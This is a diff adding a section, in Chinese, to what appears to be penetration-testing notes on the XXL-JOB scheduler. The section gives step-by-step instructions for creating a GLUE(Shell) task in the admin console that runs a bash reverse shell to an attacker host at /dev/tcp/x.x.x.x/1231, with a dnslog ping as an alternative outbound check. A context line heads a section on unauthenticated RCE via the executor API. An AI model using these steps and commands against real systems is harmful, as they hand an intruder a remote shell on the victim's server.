@@ -1,3 +1,13 @@
+# XXL-JOB-ADMIN 反弹shell
+任务管理→新增，配置如下，运行模式一定要选择GLUE(Shell)→ Cron设置成`0 0 0 * * ?` → GLUE IDE设置如下反弹代码或出网测试
+```
+#!/bin/bash
+bash -c 'exec bash -i &>/dev/tcp/x.x.x.x/1231 <&1'
+
+或
+#!/bin/bash
+ping xxx.dnslog.cn
+```
 # xxl-job 执行器 RESTful API 未授权访问 RCE
 
 ### 利用 执行日志Console 可获取命令执行成功结果：
